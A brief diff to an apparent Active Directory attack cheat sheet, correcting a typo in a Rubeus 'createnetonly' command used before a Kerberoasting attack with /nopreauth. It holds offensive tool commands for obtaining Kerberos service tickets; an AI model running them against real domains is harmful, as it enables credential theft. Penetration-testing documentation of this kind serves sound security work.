@@ -172,9 +172,9 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
   2. Target SPN or list of SPN's
 
 * **The Attack**  
-  1. Execute Rubeus in creatnetonly
+  1. Execute Rubeus in createnetonly
      ```powershell
-     Rubeus.exe creatnetonly /program:cmd.exe /show
+     Rubeus.exe createnetonly /program:cmd.exe /show
      ```
   2. Perform the attack with /nopreauth
      ```powershell
